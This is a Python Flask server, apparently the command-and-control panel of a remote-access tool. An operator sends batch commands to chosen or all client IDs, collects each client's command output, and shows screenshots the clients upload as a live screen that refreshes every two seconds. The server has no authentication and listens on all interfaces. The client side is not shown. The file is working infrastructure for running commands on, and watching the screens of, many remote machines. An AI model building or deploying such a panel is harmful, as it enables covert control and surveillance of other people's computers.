from flask import Flask, request, render_template_string, send_file

app = Flask(__name__)

commande = ""
resultat_commande = ""
destinataires = ""

html_formulaire = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Console & Live Screen</title>
</head>
<body>
  <h2>Entrer une commande Batch</h2>
  <form action="/" method="POST">
    <input type="text" name="commande" placeholder="Commande batch">
    <br>
    <label>Destinataires (* = tous, !ID pour exclure) :</label>
    <input type="text" name="destinataires" placeholder="* ou ID1,ID2,...">
    <button type="submit">Envoyer</button>
  </form>

  <form action="/clear_output" method="POST" style="margin-top: 20px;">
    <button type="submit">Clear Outputs</button>
  </form>

  <p>Dernière commande : {{ commande }}</p>
  <p>Destinataires : {{ destinataires }}</p>

  <h3>Résultat de la commande :</h3>
  <pre>{{ resultat_commande }}</pre>

  <h3>Live Screen</h3>
  <img id="screen" src="/screen.png" style="max-width:90vw; border:1px solid #ccc;">
  <script>
    // Recharge l’image toutes les 2 s pour bypasser le cache
    setInterval(function(){
      document.getElementById('screen').src = '/screen.png?' + Date.now();
    }, 2000);
  </script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    global commande, destinataires
    if request.method == "POST":
        commande = request.form.get("commande", "").strip()
        destinataires = request.form.get("destinataires", "").strip()
    return render_template_string(
        html_formulaire,
        commande=commande,
        destinataires=destinataires,
        resultat_commande=resultat_commande
    )

@app.route("/get_commande")
def get_commande():
    global commande, destinataires
    mid = request.args.get('id')
    if not mid:
        return "", 400

    if destinataires == "*":
        return commande
    elif destinataires.startswith("!"):
        excl = [i.strip() for i in destinataires[1:].split(",")]
        if mid not in excl:
            return commande
    else:
        incl = [i.strip() for i in destinataires.split(",")]
        if mid in incl:
            return commande
    return ""

@app.route("/post_resultat", methods=["POST"])
def post_resultat():
    global resultat_commande
    mid = request.form.get("id", "").strip()
    res = request.form.get("resultat", "")
    resultat_commande += f"\n[{mid}]\n{res}\n"
    return "OK", 200

@app.route("/clear_output", methods=["POST"])
def clear_output():
    global resultat_commande
    resultat_commande = ""
    return "Cleared", 200

# --- Nouveau endpoint pour recevoir le screenshot ---
@app.route("/post_screen", methods=["POST"])
def post_screen():
    f = request.files.get("screen")
    if not f:
        return "No file", 400
    # on écrase à chaque fois : latest.png
    f.save("latest.png")
    return "Screenshot reçu", 200

# --- Sert l’image courante ---
@app.route("/screen.png")
def screen_png():
    try:
        return send_file("latest.png", mimetype="image/png")
    except FileNotFoundError:
        return "", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
